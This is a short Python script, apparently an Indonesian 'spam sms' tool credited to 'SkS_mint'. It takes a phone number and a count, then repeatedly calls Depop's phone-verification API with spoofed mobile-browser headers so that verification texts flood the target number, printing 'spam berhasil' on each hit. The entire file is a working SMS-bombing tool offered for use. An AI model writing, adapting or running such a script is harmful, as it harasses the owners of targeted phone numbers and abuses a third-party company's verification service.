import requests,json,os,time
from requests import put


banner="""
\t spam sms
\t----------

[•] Creator : SkS_mint
     spam maksimum 3
------------------------
"""

os.system("clear")
print(banner)
nomor=input("[+]Nomor: ")
Jumlah=int(input("[+]Jumlah: "))
print()
headers={
"Host":"webapi.depop.com",
"content-length":"50",
"accept":"application/json, text/plain, */*",
"user-agent":"Mozilla/5.0 (Linux; Android 9; Infinix X625D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
"content-type":"application/json",
"origin":"https://signup.depop.com",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://signup.depop.com/",
"accept-encoding":"gzip, deflate, br",
"accept-language":"id-ID,id;q=0.9,jv-ID;q=0.8,jv;q=0.7,en-US;q=0.6,en;q=0.5",
}
data={
"phone_number":nomor,
"country_code":"ID"
}
for i in range(int(Jumlah)):
    respon=requests.put("https://webapi.depop.com/api/v1/auth/verify/phone",headers=headers,json=data)
    sanz=json.loads(respon.text)
    if sanz["is_verified"]==False:
        print("spam berhasil")
        time.sleep(2)
    else:
        print("spam gagal")
